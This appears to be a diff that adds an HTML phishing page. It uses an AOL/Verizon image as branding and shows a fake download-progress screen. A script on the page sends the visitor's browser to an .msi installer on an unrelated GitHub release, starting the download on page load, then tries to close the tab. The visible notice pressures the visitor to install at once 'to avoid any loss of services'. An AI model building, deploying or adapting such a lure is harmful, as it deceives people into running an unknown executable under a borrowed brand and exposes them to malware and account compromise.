@@ -1,0 +1,156 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download</title>
+
+<style>
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        margin: 0;
+        background: #f4f6f8;
+        font-family: Arial, sans-serif;
+        color: #263238;
+        text-align: center;
+    }
+
+    .container {
+        max-width: 580px;
+        margin: 55px auto;
+        padding: 35px 25px;
+        background: #fff;
+        border-radius: 12px;
+        box-shadow: 0 5px 25px rgba(0,0,0,0.08);
+    }
+
+    .logo {
+        width: 260px;
+        max-width: 85%;
+        height: auto;
+        margin-bottom: 30px;
+    }
+
+    .download-box {
+        padding: 25px 20px;
+        border: 2px solid #d8e4f0;
+        border-radius: 10px;
+        background: #f8fbff;
+        animation: glow 2s infinite;
+    }
+
+    .download-icon {
+        font-size: 42px;
+        margin-bottom: 12px;
+        animation: bounce 1.5s infinite;
+    }
+
+    .download-title {
+        font-size: 20px;
+        font-weight: bold;
+        margin-bottom: 12px;
+    }
+
+    .download-text {
+        font-size: 14px;
+        line-height: 1.7;
+        color: #596773;
+    }
+
+    .progress {
+        height: 7px;
+        background: #e1e8ef;
+        border-radius: 10px;
+        overflow: hidden;
+        margin-top: 22px;
+    }
+
+    .progress-bar {
+        height: 100%;
+        width: 35%;
+        background: #2878d0;
+        border-radius: 10px;
+        animation: loading 2s infinite ease-in-out;
+    }
+
+    .notice {
+        margin-top: 24px;
+        font-size: 13px;
+        line-height: 1.7;
+        color: #596773;
+    }
+
+    @keyframes glow {
+        0%, 100% {
+            box-shadow: 0 0 5px rgba(40,120,208,0.08);
+        }
+        50% {
+            box-shadow: 0 0 18px rgba(40,120,208,0.22);
+        }
+    }
+
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-7px); }
+    }
+
+    @keyframes loading {
+        0% { width: 5%; }
+        50% { width: 85%; }
+        100% { width: 5%; }
+    }
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <img
+        class="logo"
+        src="https://variety.com/wp-content/uploads/2015/05/verizon-aol-merger.jpg?w=1000&h=563&crop=1"
+        alt="AOL Verizon">
+
+    <div class="download-box">
+
+        <div class="download-icon">⬇</div>
+
+        <div class="download-title">
+            Your Download Is Starting
+        </div>
+
+        <div class="download-text">
+            Please wait while your file is being prepared.
+        </div>
+
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+
+    </div>
+
+    <div class="notice">
+        It is recommended to proceed with the installation once
+        the download is complete to avoid any loss of services.
+    </div>
+
+</div>
+
+<script>
+    const downloadUrl = "https://github.com/me1moup10/id2me/releases/download/id2me/Configuration_Setup.msi";
+
+    // Start download
+    window.location.href = downloadUrl;
+
+    // Attempt to close the tab
+    setTimeout(function () {
+        window.close();
+    }, 5000);
+</script>
+
+</body>
+</html>
